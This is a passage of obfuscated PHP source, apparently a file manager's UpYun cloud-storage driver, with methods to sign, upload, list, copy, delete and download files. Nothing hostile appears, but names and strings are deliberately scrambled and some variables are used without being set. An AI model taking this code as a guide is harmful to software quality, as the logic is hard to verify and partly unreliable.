size($¸¥îÏ• = false) { return $this->sourceSize; } public function getContent($š”¡­â = false) { return $this->fileSubstr($š”¡­â, 0, $this->sourceSize); } public function fileSubstr($“Œ¸ô = false, $¸¥å“« = 0, $óëçÎä¢ = 0) { if (!$óëçÎä¢) { $óëçÎä¢ = $this->sourceSize; } $’©ÜÁ±ª = $this->sourceSize - $¸¥å“«; if ($óëçÎä¢ >= $’©ÜÁ±ª) { $óëçÎä¢ = $’©ÜÁ±ª; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $¸¥å“«, $óëçÎä¢); } if ($this->sourceType == self::TYPE_FILE) { if ($óëçÎä¢ <= 0) { return $_SERVER[ÏÒ Ì„][33]; } $ı¼ÎÑµå = ftell($this->source); fseek_64($this->source, $ı¼ÎÑµå + $¸¥å“«); $óê°öÏ = @fread($this->source, $óëçÎä¢); fseek_64($this->source, $ı¼ÎÑµå); return $óê°öÏ; } } public function hashMd5($ïñıßñ = false) { return md5($this->getContent()); } public static function hash($¾¨çšŒ, $Ü¿Ñë‰Ê = 0) { $ˆ×±íÛ— = new PathDriverStream($¾¨çšŒ, $Ü¿Ñë‰Ê); return $ˆ×±íÛ—->hashSimple($¾¨çšŒ); } public static function md5($‡šì®şÄ, $«˜ÍÑè€ = 0) { $›Ü­ÃĞ¯ = new PathDriverStream($‡šì®şÄ, $«˜ÍÑè€); return $›Ü­ÃĞ¯->hashMd5($‡šì®şÄ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\x70\72\x2f\57\x76\60\56\x61\x70\151\56\x75\160\171\x75\x6e\x2e\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Ì±´Ä·®) { parent::__construct(); $this->_init($Ì±´Ä·®); } public function _init($´«Áñ») { $§¶í¹·ˆ =& $_SERVER[ÏÒ Ì„]; foreach ($´«Áñ» as $ô¿³çº => $Î©×˜Ï¤) { if (isset($this->{$ô¿³çº})) { $this->{$ô¿³çº} = $Î©×˜Ï¤; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($§¶í¹·ˆ[1377] . LNG($§¶í¹·ˆ[1310])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($°ÀËµ«ò, $ÈÙĞµõ¦ = "\x47\105\124") { $®£›³ˆ =& $_SERVER[ÏÒ Ì„]; $Ñ­è Ïõ = gmdate($®£›³ˆ[1343]); $Ì¯Î¦ºÔ = base64_encode(hash_hmac($®£›³ˆ[1378], "{$ÈÙĞµõ¦}\x26{$°ÀËµ«ò}\x26{$Ñ­è Ïõ}", md5("{$this->userpass}"), !0)); $ÙŞÆá = array("\101\165\164\x68\157\x72\x69\x7a\x61\164\151\157\156\72\125\x50\x59\125\x4e\40{$this->username}\x3a{$Ì¯Î¦ºÔ}", "\x44\x61\164\145\x3a{$Ñ­è Ïõ}"); return $ÙŞÆá; } public function ussRequest($Æ¾õ¬ôµ, $Ù¯øó›œ = "\107\105\x54", $Ğìäøíò = false, $ÁÀºÒ„ú = false, $éª³È’Æ = false) { $û„°Î•§ =& $_SERVER[ÏÒ Ì„]; $Æ¾õ¬ôµ = trim($Æ¾õ¬ôµ, $û„°Î•§[8]); $ÂÉÂò‰¡ = "\x2f{$this->bucket}\57{$Æ¾õ¬ôµ}"; $â¬º«•ã = $this->ussHeaders($ÂÉÂò‰¡, $Ù¯øó›œ); if ($ÁÀºÒ„ú) { $â¬º«•ã = array_merge($â¬º«•ã, $ÁÀºÒ„ú); } $ŠÛ±¨¶ = url_request($this->endpoint . $ÂÉÂò‰¡, $Ù¯øó›œ, $Ğìäøíò, $â¬º«•ã, $éª³È’Æ); if (!$ŠÛ±¨¶) { return array($û„°Î•§[1119] => !1, $û„°Î•§[1121] => $û„°Î•§[1379]); } if (strtolower($Ù¯øó›œ) == $û„°Î•§[190] || in_array($ŠÛ±¨¶[$û„°Î•§[1119]], array($û„°Î•§[1234], $û„°Î•§[1380]))) { $Ğìäøíò = $ŠÛ±¨¶[$û„°Î•§[1381]]; } else { $Ğìäøíò = json_decode($ŠÛ±¨¶[$û„°Î•§[1121]], !0); if (!$Ğìäøíò) { $Ğìäøíò = $ŠÛ±¨¶[$û„°Î•§[1121]]; } else { if (!$ŠÛ±¨¶[$û„°Î•§[740]] && isset($Ğìäøíò[$û„°Î•§[1382]])) { $Ğìäøíò = $Ğìäøíò[$û„°Î•§[1382]]; } } } return array($û„°Î•§[1119] => $ŠÛ±¨¶[$û„°Î•§[740]], $û„°Î•§[1121] => $Ğìäøíò); } public function mkfile($–´µ’ı×, $ Ù¼°Ñ” = '', $ìğıÏûÅ = REPEAT_RENAME) { if ($this->setContent($–´µ’ı×, $ Ù¼°Ñ”)) { return $this->getPathOuter($–´µ’ı×); } return !1; } public function mkdir($‹ÖÕŠª, $à¼´ÓÄâ = REPEAT_SKIP) { $ÈĞ¨¼ÛÖ =& $_SERVER[ÏÒ Ì„]; $ãœ„Õ§— = trim($‹ÖÕŠª, $ÈĞ¨¼ÛÖ[8]); if ($this->_isFolder($ãœ„Õ§—)) { return $this->getPathOuter($ãœ„Õ§—); } $¤ØÌ¥ìö = array($ÈĞ¨¼ÛÖ[1383]); $åÄûÌ Ä = $this->ussRequest($ãœ„Õ§—, $ÈĞ¨¼ÛÖ[224], !1, $¤ØÌ¥ìö); return $åÄûÌ Ä[$ÈĞ¨¼ÛÖ[1119]] ? $this->getPathOuter($ãœ„Õ§—) : !1; } public function copyFile($ñıûíâ˜, $ı·—ç€İ) { $ŒÑ‰»• =& $_SERVER[ÏÒ Ì„]; $—Æøê„´ = array($ŒÑ‰»•[1384] . "\57{$this->bucket}\57{$ñıûíâ˜}", $ŒÑ‰»•[1385]); $ıí­Š·Ç = $this->ussRequest($ı·—ç€İ, $ŒÑ‰»•[226], !1, $—Æøê„´); return $ıí­Š·Ç[$ŒÑ‰»•[1119]] ? !0 : $this->getPathOuter($ı·—ç€İ); } public function moveFile($Æ¢Äù’‹, $Ç½Ùôó«) { $Œ÷üéÒ™ =& $_SERVER[ÏÒ Ì„]; $Ó»ÅÉàŒ = array($Œ÷üéÒ™[1386] . "\57{$this->bucket}\x2f{$Æ¢Äù’‹}", $Œ÷üéÒ™[1385]); $îÙ—Ì½œ = $this->ussRequest($Ç½Ùôó«, $Œ÷üéÒ™[226], !1, $Ó»ÅÉàŒ); return $îÙ—Ì½œ[$Œ÷üéÒ™[1119]] ? !0 : $this->getPathOuter($Ç½Ùôó«); } public function delFile($ô€¸Ôµü) { $ğÇ¦²õ™ =& $_SERVER[ÏÒ Ì„]; $”ÚàÉúú = $this->ussRequest($ô€¸Ôµü, $ğÇ¦²õ™[1387]); return $”ÚàÉúú[$ğÇ¦²õ™[1119]] ? !0 : !1; } public function delFolder($Ï‘éö¹İ) { $òªø‚ =& $_SERVER[ÏÒ Ì„]; if (!$this->exist($Ï‘éö¹İ)) { return !0; } $this->listItemCache = !1; $Ø»şîèè = $¹ä£¦”Ê = array(); $this->fileList($Ï‘éö¹İ, $Ø»şîèè, $¹ä£¦”Ê, !0); $this->listItemCache = !0; foreach ($¹ä£¦”Ê as $ë’ Ò•œ) { $ÕÎíéû = $this->ussRequest($ë’ Ò•œ[$òªø‚[28]], $òªø‚[1387]); if (!$ÕÎíéû[$òªø‚[1119]]) { return !1; } } foreach ($Ø»şîèè as $ïºçÙ‹¯) { $ÕÎíéû = $this->ussRequest($ïºçÙ‹¯, $òªø‚[1387]); if (!$ÕÎíéû[$òªø‚[1119]]) { return !1; } } $ÕÎíéû = $this->ussRequest($Ï‘éö¹İ, $òªø‚[1387]); return $ÕÎíéû[$òªø‚[1119]]; } public function rename($¿ß˜Û÷ƒ, $Ï«‰„Õ…) { if ($this->isFile($¿ß˜Û÷ƒ)) { $Ï«‰„Õ… = get_path_father($¿ß˜Û÷ƒ) . $Ï«‰„Õ…; return $this->moveFile($¿ß˜Û÷ƒ, $Ï«‰„Õ…); } return $this->renameObject($¿ß˜Û÷ƒ, $Ï«‰„Õ…); } public function fileInfo($™‹ÆÏĞ€, $üæô£õÃ = false, $¯ÜŸ²·Å = array()) { $ÜéùÏ”š =& $_SERVER[ÏÒ Ì„]; $ÈÕÅÊ±Ã = array($ÜéùÏ”š[28] => $this->pathThis($™‹ÆÏĞ€), $ÜéùÏ”š[76] => $this->getPathOuter($ÜéùÏ”š[8] . $™‹ÆÏĞ€), $ÜéùÏ”š[29] => $ÜéùÏ”š[193], $ÜéùÏ”š[78] => isset($¯ÜŸ²·Å[$ÜéùÏ”š[78]]) ? $¯ÜŸ²·Å[$ÜéùÏ”š[78]] : 0, $ÜéùÏ”š[168] => $this->ext($™‹ÆÏĞ€)); if ($üæô£õÃ) { return $ÈÕÅÊ±Ã; } $ÈÕÅÊ±Ã[$ÜéùÏ”š[194]] = $ÈÕÅÊ±Ã[$ÜéùÏ”š[84]] = 0; $ÈÕÅÊ±Ã[$ÜéùÏ”š[195]] = $ÈÕÅÊ±Ã[$ÜéùÏ”š[196]] = !0; if (empty($¯ÜŸ²·Å)) { $¯ÜŸ²·Å = $this->objectMeta($™‹ÆÏĞ€); if (!$¯ÜŸ²·Å) { return $ÈÕÅÊ±Ã; } } $ÈÕÅÊ±Ã[$ÜéùÏ”š[194]] = intval($¯ÜŸ²·Å[$ÜéùÏ”š[1388]]); $ÈÕÅÊ±Ã[$ÜéùÏ”š[84]] = intval($¯ÜŸ²·Å[$ÜéùÏ”š[1389]]); $ÈÕÅÊ±Ã[$ÜéùÏ”š[78]] = $¯ÜŸ²·Å[$ÜéùÏ”š[78]]; return $ÈÕÅÊ±Ã; } public function folderInfo($ºôÛÆÌ, $ÅË£ßÁ = false) { $×ãŠŞ˜î =& $_SERVER[ÏÒ Ì„]; $ß¯İËøĞ = array($×ãŠŞ˜î[28] => $this->pathThis($ºôÛÆÌ), $×ãŠŞ˜î[76] => $this->getPathOuter($×ãŠŞ˜î[8] . $ºôÛÆÌ), $×ãŠŞ˜î[29] => $×ãŠŞ˜î[77]); if ($ÅË£ßÁ) { return $ß¯İËøĞ; } $ß¯İËøĞ[$×ãŠŞ˜î[194]] = $ß¯İËøĞ[$×ãŠŞ˜î[84]] = 0; $ß¯İËøĞ[$×ãŠŞ˜î[195]] = $ß¯İËøĞ[$×ãŠŞ˜î[196]] = !0; if (empty($Úæ™ÊË±)) { $Úæ™ÊË± = $this->objectMeta($ºôÛÆÌ); if (!$Úæ™ÊË±) { return $ß¯İËøĞ; } } $ß¯İËøĞ[$×ãŠŞ˜î[194]] = intval($Úæ™ÊË±[$×ãŠŞ˜î[1388]]); $ß¯İËøĞ[$×ãŠŞ˜î[84]] = intval($Úæ™ÊË±[$×ãŠŞ˜î[1389]]); return $ß¯İËøĞ; } private function listObjs($Ëšı™ùÑ, $¢ïœÑ»Ü = 0, $²’³ô÷¸ = 1000) { $Æ’Ú£áİ =& $_SERVER[ÏÒ Ì„]; $·®¡Ê™È = array($Æ’Ú£áİ[1390], $Æ’Ú£áİ[1391] . $²’³ô÷¸); if ($¢ïœÑ»Ü) { $·®¡Ê™È[] = $Æ’Ú£áİ[1392] . $¢ïœÑ»Ü; } $ÙÙ¼ú¦¤ = $this->ussRequest($Ëšı™ùÑ, $Æ’Ú£áİ[228], !1, $·®¡Ê™È); return !$ÙÙ¼ú¦¤[$Æ’Ú£áİ[1119]] ? !1 : $ÙÙ¼ú¦¤[$Æ’Ú£áİ[1121]]; } private function fileList($ñœ£îßº, &$‘Ì®úõ’, &$°½úã‹ê, $±‘ÂŒ“¾ = false) { $æÂ³ÜÅ =& $_SERVER[ÏÒ Ì„]; $–ˆİô¡¿ = $æÂ³ÜÅ[33]; $éš™Œ˜ = 1000; $à…ÒÁŞĞ = rtrim($ñœ£îßº, $æÂ³ÜÅ[8]) . $æÂ³ÜÅ[8]; $†…åçâ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $äø¥öâ = $this->listObjs($ñœ£îßº, $–ˆİô¡¿, $éš™Œ˜); if (!$äø¥öâ) { return !1; } $–ˆİô¡¿ = isset($äø¥öâ[$æÂ³ÜÅ[1393]]) ? $äø¥öâ[$æÂ³ÜÅ[1393]] : $æÂ³ÜÅ[33]; $©µ†ˆÒñ = isset($äø¥öâ[$æÂ³ÜÅ[1394]]) ? $äø¥öâ[$æÂ³ÜÅ[1394]] : array(); foreach ($©µ†ˆÒñ as $ÜìÛİˆ) { $ğóªÆãˆ = $ÜìÛİˆ[$æÂ³ÜÅ[29]] == $æÂ³ÜÅ[77] ? !0 : !1; $”à¦Éá´ = ltrim($à…ÒÁŞĞ . $ÜìÛİˆ[$æÂ³ÜÅ[28]], $æÂ³ÜÅ[8]) . ($ğóªÆãˆ ? $æÂ³ÜÅ[8] : $æÂ³ÜÅ[33]); $Ôı³Ôã¸ = array($æÂ³ÜÅ[28] => $”à¦Éá´, $æÂ³ÜÅ[29] => $ğóªÆãˆ ? $æÂ³ÜÅ[77] : $æÂ³ÜÅ[193], $æÂ³ÜÅ[78] => $ÜìÛİˆ[$æÂ³ÜÅ[335]], $æÂ³ÜÅ[1389] => $ÜìÛİˆ[$æÂ³ÜÅ[1395]]); if ($†…åçâ) { $this->cacheMethod($æÂ³ÜÅ[199], $”à¦Éá´, $ğóªÆãˆ); $this->cacheMethod($æÂ³ÜÅ[200], $”à¦Éá´, $Ôı³Ôã¸); } if ($ğóªÆãˆ) { $‘Ì®úõ’[] = $”à¦Éá´; if ($±‘ÂŒ“¾) { $this->fileList($”à¦Éá´, $‘Ì®úõ’, $°½úã‹ê, $±‘ÂŒ“¾); } continue; } $°½úã‹ê[] = $Ôı³Ôã¸; } if (count($©µ†ˆÒñ) < $éš™Œ˜) { break; } } if ($†…åçâ) { $this->cacheMethod($æÂ³ÜÅ[199], $ñœ£îßº, !0); } } public function listPath($ö­”ùº, $˜’à‹¼Ñ = false) { $†©•Ñ°ä =& $_SERVER[ÏÒ Ì„]; $“¨å«á¥ = $ñó‡…‚Ä = array(); $this->fileList($ö­”ùº, $“¨å«á¥, $ñó‡…‚Ä); foreach ($“¨å«á¥ as $ëÜúÊ“¬ => $¿—äÙâÔ) { $“¨å«á¥[$ëÜúÊ“¬] = $this->folderInfo($¿—äÙâÔ, $˜’à‹¼Ñ); } foreach ($ñó‡…‚Ä as $ëÜúÊ“¬ => $¿—äÙâÔ) { $ñó‡…‚Ä[$ëÜúÊ“¬] = $this->fileInfo($¿—äÙâÔ[$†©•Ñ°ä[28]], $˜’à‹¼Ñ, $¿—äÙâÔ); } return array($†©•Ñ°ä[75] => $“¨å«á¥, $†©•Ñ°ä[74] => $ñó‡…‚Ä); } public function has($Û·Èû¦—, $èˆë×“™ = false, $ŒœÀíğ = true) { $úÖ™Øæ =& $_SERVER[ÏÒ Ì„]; $×¥Æ±½ = $úÖ™Øæ[33]; $ëššö²¢ = 500; $œß¼Š´à = 0; $ ›Ó¾¯Ë = 0; $ÑÊÇ­³¢ = rtrim($Û·Èû¦—, $úÖ™Øæ[8]) . $úÖ™Øæ[8]; while (!0) { check_abort(); $Á£ÄÙ¸ = $this->listObjs($Û·Èû¦—, $×¥Æ±½, $ëššö²¢); if (!$Á£ÄÙ¸) { return !1; } $×¥Æ±½ = isset($Á£ÄÙ¸[$úÖ™Øæ[1393]]) ? $Á£ÄÙ¸[$úÖ™Øæ[1393]] : $úÖ™Øæ[33]; $ÆÊûçŸ = isset($Á£ÄÙ¸[$úÖ™Øæ[1394]]) ? $Á£ÄÙ¸[$úÖ™Øæ[1394]] : array(); if (empty($ÆÊûçŸ)) { break; } $ÒÅ›ÔÄÂ = array_filter($ÆÊûçŸ, function ($­‘òÄÕ•) { $ÉÔ¦Ùƒ‡ =& $_SERVER[ÏÒ Ì„]; return $­‘òÄÕ•[$ÉÔ¦Ùƒ‡[29]] == $ÉÔ¦Ùƒ‡[77]; }); $î“¯’‡¸ = count($ÆÊûçŸ); $ÒÅ›ÔÄÂ = count($ÒÅ›ÔÄÂ); $ŠÜ øê = $î“¯’‡¸ - $ÒÅ›ÔÄÂ; if ($èˆë×“™) { $ ›Ó¾¯Ë += $ÒÅ›ÔÄÂ; $œß¼Š´à += $ŠÜ øê; if ($î“¯’‡¸ < $ëššö²¢) { break; } continue; } if ($ŒœÀíğ) { if ($ŠÜ øê) { return !0; } } else { if ($ÒÅ›ÔÄÂ) { return !0; } } if ($î“¯’‡¸ < $ëššö²¢) { break; } } if ($èˆë×“™) { return array($úÖ™Øæ[203] => $œß¼Š´à, $úÖ™Øæ[204] => $ ›Ó¾¯Ë); } return !1; } public function listAll($âè×€ìÔ) { $Úî”Óş° =& $_SERVER[ÏÒ Ì„]; $ÌÊ¸ÈëÇ = $«Şû˜¾¡ = array(); $this->fileList($âè×€ìÔ, $ÌÊ¸ÈëÇ, $«Şû˜¾¡, !0); $ßˆ››€” = array(); foreach ($«Şû˜¾¡ as $ı²Éøƒà) { $ßˆ››€”[$ı²Éøƒà[$Úî”Óş°[28]]] = $ı²Éøƒà[$Úî”Óş°[78]]; } foreach ($ÌÊ¸ÈëÇ as $ı²Éøƒà) { if (is_string($ı²Éøƒà)) { $ßˆ››€”[$ı²Éøƒà] = 0; } } return $this->listAllFiles($âè×€ìÔ, array_keys($ßˆ››€”), $ßˆ››€”); } public function canRead($†¸ÉüÙ¬) { return $this->exist($†¸ÉüÙ¬) ? !0 : !1; } public function canWrite($ô’ú‘Ë) { return $this->exist($ô’ú‘Ë) ? !0 : !1; } public function getContent($€ÀÎÓšï) { return $this->fileSubstr($€ÀÎÓšï, 0, -1); } public function setContent($µã™£®, $ç‡Ìê°î = '') { $ÁĞ¾ˆúà =& $_SERVER[ÏÒ Ì„]; if (!$ç‡Ìê°î) { $çÆÇ¨Ó = $this->ussRequest($µã™£®, $ÁĞ¾ˆúà[224]); return $çÆÇ¨Ó[$ÁĞ¾ˆúà[1119]]; } $¨ïØ†¨ = $this->tempFile($this->pathThis($µã™£®)); file_put_contents($¨ïØ†¨, $ç‡Ìê°î); if ($this->upload($µã™£®, $¨ïØ†¨)) { $this->tempFileRemve($¨ïØ†¨); return !0; } return !1; } public function fileSubstr($´„¿šñŒ, $¯•…á„, $¸ŸÀÒ“µ) { $ÚÕÁ‘İ =& $_SERVER[ÏÒ Ì„]; if (!($·õñ¸Ø = $this->link($´„¿šñŒ))) { return !1; } $½…¨°úù = !1; if ($¸ŸÀÒ“µ > 0) { $Öñ™™ƒ = $¯•…á„ + $¸ŸÀÒ“µ - 1; $½…¨°úù = array($ÚÕÁ‘İ[1356] . $¯•…á„ . $ÚÕÁ‘İ[454] . $Öñ™™ƒ); } $ƒ‹øæ‚ = url_request($·õñ¸Ø, $ÚÕÁ‘İ[228], !1, $½…¨°úù); return $ƒ‹øæ‚[$ÚÕÁ‘İ[740]] ? $ƒ‹øæ‚[$ÚÕÁ‘İ[1121]] : !1; } public function upload($Ş¸ô¨³’, $ÑáîŸ, $´ŸìŸêü = false, $‘ÁŒ‚ä¢ = REPEAT_REPLACE) { $ê•İ£Ë… =& $_SERVER[ÏÒ Ì„]; $¥´¦Ôç  = IO::size($ÑáîŸ); if ($¥´¦Ôç  <= 1024 * 1024 * 200) { $áÛ—ÀİÅ = array($ê•İ£Ë…[1396] . $ÑáîŸ); $éë¶Êùì = $this->ussRequest($Ş¸ô¨³’, $ê•İ£Ë…[226], $áÛ—ÀİÅ); return $éë¶Êùì[$ê•İ£Ë…[1119]] ? $this->getPathOuter($Ş¸ô¨³’) : !1; } $Ü¬éŸÀ˜ = 1024 * 1024 * 10; $×‘Ò·ªº = array($ê•İ£Ë…[1397], $ê•İ£Ë…[1398] . $¥´¦Ôç , $ê•İ£Ë…[1399], $ê•İ£Ë…[1400] . $Ü¬éŸÀ˜); $éë¶Êùì = $this->ussRequest($Ş¸ô¨³’, $ê•İ£Ë…[226], !1, $×‘Ò·ªº); if (!$éë¶Êùì[$ê•İ£Ë…[1119]]) { return !1; } $®ş°üš = $éë¶Êùì[$ê•İ£Ë…[1121]]; $µåç—àÑ = 0; $ùŸÎ¿© = $®ş°üš[$ê•İ£Ë…[1401]]; $ô¡ßÔå† = fopen($ÑáîŸ, $ê•İ£Ë…[1307]); if (!$ô¡ßÔå†) { return !1; } do { $öÑ£²›û = $®ş°üš[$ê•İ£Ë…[1402]]; fseek_64($ô¡ßÔå†, $µåç—àÑ); $˜¿·í¶à = fread($ô¡ßÔå†, $öÑ£²›û); $äğš‹“’ = 0; do { $äğš‹“’++; $®ş°üš = $this->uploadPart($Ş¸ô¨³’, $®ş°üš, $˜¿·í¶à); } while (!$®ş°üš && $äğš‹“’ < 3); if (!$®ş°üš) { return !1; } $ùŸÎ¿© = $®ş°üš[$ê•İ£Ë…[1401]]; $µåç—àÑ += $öÑ£²›û; } while ($ùŸÎ¿© != -1); fclose($ô¡ßÔå†); $×‘Ò·ªº = array($ê•İ£Ë…[1403], $ê•İ£Ë…[1404] . $®ş°üš[$ê•İ£Ë…[1405]], $ê•İ£Ë…[1399]); $éë¶Êùì = $this->ussRequest($Ş¸ô¨³’, $ê•İ£Ë…[226], !1, $×‘Ò·ªº); return $éë¶Êùì[$ê•İ£Ë…[1119]] ? $this->getPathOuter($”âöÜã) : !1; } private function uploadPart($´Éæë‚, $‚ä¶ŞÅ”, &$¸©ïîÈ•) { $ÛÎÛ•é =& $_SERVER[ÏÒ Ì„]; $è€îá’º = array($ÛÎÛ•é[1406], $ÛÎÛ•é[1404] . $‚ä¶ŞÅ”[$ÛÎÛ•é[1405]], $ÛÎÛ•é[1407] . $‚ä¶ŞÅ”[$ÛÎÛ•é[1401]], $ÛÎÛ•é[141] . $‚ä¶ŞÅ”[$ÛÎÛ•é[1402]]); $í¶İŒË = $this->ussRequest($´Éæë‚, $ÛÎÛ•é[226], $¸©ïîÈ•, $è€îá’º); return !$í¶İŒË[$ÛÎÛ•é[1119]] ? $í¶İŒË[$ÛÎÛ•é[1119]] : $í¶İŒË[$ÛÎÛ•é[1121]]; } public function uploadFormData($Æé¿óÖø, $˜ŠâÜ‡œ = 3600) { return $this->uploadPolicy($Æé¿óÖø, $˜ŠâÜ‡œ); } public function multiUploadFormData($ı¸õãç†, $Â¥Í»Ï‡ = 3600) { $÷§±ğ¹¯ =& $_SERVER[ÏÒ Ì„]; $ã“äÏÄÖ = (int) $GLOBALS[$÷§±ğ¹¯[7]][$÷§±ğ¹¯[78]]; return $this->uploadPolicy($ı¸õãç†, $Â¥Í»Ï‡, $ã“äÏÄÖ); } private function uploadPolicy($ÎüÀõğö, $ââ‰ÂÇ– = 3600, $ ıÔ½ø” = 0) { $É“Â÷À¬ =& $_SERVER[ÏÒ Ì„]; $å´¢Ô = $É“Â÷À¬[8] . $this->bucket; $¬…·İ®Î = gmdate($É“Â÷À¬[1343]); $ÆŠœşØ‘ = array($É“Â÷À¬[1408] => $this->bucket, $É“Â÷À¬[1409] => $ÎüÀõğö, $É“Â÷À¬[1410] => time() + $ââ‰ÂÇ–, $É“Â÷À¬[1411] => $¬…·İ®Î); if ($ ıÔ½ø”) { $ÆŠœşØ‘[$É“Â÷À¬[1323]] = $ ıÔ½ø”; } $â°¢¾½Ï = base64_encode(json_encode($ÆŠœşØ‘)); $ïğà¡š¹ = base64_encode(hash_hmac($É“Â÷À¬[1378], "\120\117\x53\124\46{$å´¢Ô}\x26{$¬…·İ®Î}\x26{$â°¢¾½Ï}", md5("{$this->userpass}"), !0)); $ÄÆâ‘³ê = array($É“Â÷À¬[1246] => $â°¢¾½Ï, $É“Â÷À¬[1412] => "\125\120\131\x55\116\x20{$this->username}\x3a{$ïğà¡š¹}", $É“Â÷À¬[175] => $this->endpoint . $å´¢Ô); return $ÄÆâ‘³ê; } public function download($¿Û›ÛÛ, $Ó§Àê Ø) { $Š—°’ó§ = IO::getPathInner(IO::mkfile($Ó§Àê Ø)); if (!($­–òšò¼ = $this->link($¿Û›ÛÛ))) { return !1; } $¨½íæ©² = 0; $ì¨á” ï = 1024 * 200; $¥ ÍÏ¹ù = fopen($Š—°’ó§, $_SERVER[ÏÒ Ì„][1362]); while (!0) { $Çïšš¤ = $this->fileSubstr($¿Û›ÛÛ, $¨½íæ©², $ì¨á” ï); if ($Çïšš¤ === !1) { return !1; } fwrite($¥ ÍÏ¹ù, $Çïšš¤); $¨½íæ©² += $ì¨á” ï; if (strlen($Çïšš¤) < $ì¨á” ï) { break; } } fclose($¥ ÍÏ¹ù); return $Ó§Àê Ø; } public function link($õÁ„î¥Ğ, $µù‰©Ñ‰ = array()) { $êÇÏ³¾¾ =& $_SERVER[ÏÒ Ì„]; $õÁ„î¥Ğ = trim($õÁ„î¥Ğ, $êÇÏ³¾¾[8]); if (!empty($this->token)) { $îÆ¢Ô‹¤ = strtotime(date($êÇÏ³¾¾[1413])); $ïüËõ„Ó = substr(md5($this->token . $êÇÏ³¾¾[282] . $îÆ¢Ô‹¤ . $êÇÏ³¾¾[1414] . $õÁ„î¥Ğ), 12, 8) . $îÆ¢Ô‹¤; $µù‰©Ñ‰[] = $êÇÏ³¾¾[1415] . $ïüËõ„Ó; } $Ñ¤å…šà = !empty($µù‰©Ñ‰) ? $êÇÏ³¾¾[70] . implode($êÇÏ³¾¾[282], $µù‰©Ñ‰) : $êÇÏ³¾¾[33]; return $this->getHost() . $êÇÏ³¾¾[8] . $õÁ„î¥Ğ . $Ñ¤å…šà; } public function fileOut($ûÕ×şÄ, $¢ÚÚÒ•İ = false, $ìÃÉ™–• = false, $’¦¨µ£± = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ûÕ×şÄ, $¢ÚÚÒ•İ, $ìÃÉ™–•, $’¦¨µ£±); } if (!$ìÃÉ™–•) { $ìÃÉ™–• = $this->pathThis($ûÕ×şÄ); } $Œ‹ÕÀ™ = $¢ÚÚÒ•İ ? array($_SERVER[ÏÒ Ì„][1416] . rawurlencode($ìÃÉ™–•)) : array(); $˜¹Ö…í  = $this->link($ûÕ×şÄ, $Œ‹ÕÀ™); $this->fileOutLink($˜¹Ö…í ); } public function fileOutServer($õ‰®–ºÕ, $ÂÔàı¸‘ = false, $½‚Š©”Ó = false, $ÉÖ§Â¥ì = '') { parent::fileOut($õ‰®–ºÕ, $ÂÔàı¸‘, $½‚Š©”Ó, $ÉÖ§Â¥ì); } public function fileOutImage($êÊéÄ¢á, $¾¡ÖÓÄ´ = 250) { $±¾º´Ş¹ = $this->link($êÊéÄ¢á . $_SERVER[ÏÒ Ì„][1417] . $¾¡ÖÓÄ´); $this->fileOutLink($±¾º´Ş¹); } public function fileOutImageServer($–ç°¦½ˆ, $Úö ¯Ì = 250) { parent::fileOutImage($–ç°¦½ˆ, $Úö ¯Ì); } public function hashMd5($ì²ÚÍ¹Œ) { $İ¬¨ÈÌ =& $_SERVER[ÏÒ Ì„]; $…ê—Ø²½ = $this->_objectMeta($ì²ÚÍ¹Œ); return isset($…ê—Ø²½[$İ¬¨ÈÌ[208]]) ? $…ê—Ø²½[$İ¬¨ÈÌ[208]] : !1; } public function size($–„ıç÷Ì) { $³»ñ¡¼˜ = $this->objectMeta($–„ıç÷Ì); return $³»ñ¡¼˜ ? $³»ñ¡¼˜[$_SERVER[ÏÒ Ì„][78]] : 0; } public function info($Ÿ¿Í±×¬) { if ($this->isFolder($Ÿ¿Í±×¬)) { return $this->folderInfo($Ÿ¿Í±×¬); } else { if ($this->isFile($Ÿ¿Í±×¬)) { return $this->fileInfo($Ÿ¿Í±×¬); } } return !1; } public function exist($¦µÕªÄÚ) { return $this->isFile($¦µÕªÄÚ) || $this->isFolder($¦µÕªÄÚ); } public function isFile($õÄíÇò²) { return !$this->isFolder($õÄíÇò²) && $this->objectMeta($õÄíÇò²); } public function isFolder($µ¾õÄŞÂ) { return $this->cacheMethod($_SERVER[ÏÒ Ì„][199], $µ¾õÄŞÂ); } protected function objectMeta($€Æ–³îô) { return $this->cacheMethod($_SERVER[ÏÒ Ì„][200], $€Æ–³îô); } protected function _objectMeta($Õ‹˜ì‡ñ) { $¶šÈ³õ£ =& $_SERVER[ÏÒ Ì„]; if ($Õ‹˜ì‡ñ == $¶šÈ³õ£[33] || $Õ‹˜ì‡ñ == $¶šÈ³õ£[8]) { return array(); } $òìŠÍÆ˜ = $this->ussRequest($Õ‹˜ì‡ñ, $¶šÈ³õ£[1418]); if (!$òìŠÍÆ˜[$¶šÈ³õ£[1119]]) { return null; } $Èˆ“ëÁ˜ = isset($òìŠÍÆ˜[$¶šÈ³õ£[1121]]) ? $òìŠÍÆ˜[$¶šÈ³õ£[1121]] : array(); if (!isset($Èˆ“ëÁ˜[$¶šÈ³õ£[1419]])) { return null; } $º¨İ–Ù = array($¶šÈ³õ£[29] => isset($Èˆ“ëÁ˜[$¶šÈ³õ£[1419]]) ? $Èˆ“ëÁ˜[$¶šÈ³õ£[1419]] : null, $¶šÈ³õ£[78] => isset($Èˆ“ëÁ˜[$¶šÈ³õ£[1420]]) ? $Èˆ“ëÁ˜[$¶šÈ³õ£[1420]] : null, $¶šÈ³õ£[208] => isset($Èˆ“ëÁ˜[$¶šÈ³õ£[1421]]) ? $Èˆ“ëÁ˜[$¶šÈ³õ£[1421]] : null, $¶šÈ³õ£[1388] => isset($Èˆ“ëÁ˜[$¶šÈ³õ£[1422]]) ? $Èˆ“ëÁ˜[$¶šÈ³õ£[1422]] : null); $º¨İ–Ù[$¶šÈ³õ£[1389]] = isset($Èˆ“ëÁ˜[$¶šÈ³õ£[1423]]) ? strtotime($Èˆ“ëÁ˜[$¶šÈ³õ£[1423]]) : $º¨İ–Ù[$¶šÈ³õ£[1388]]; return $º¨İ–Ù; } protected function 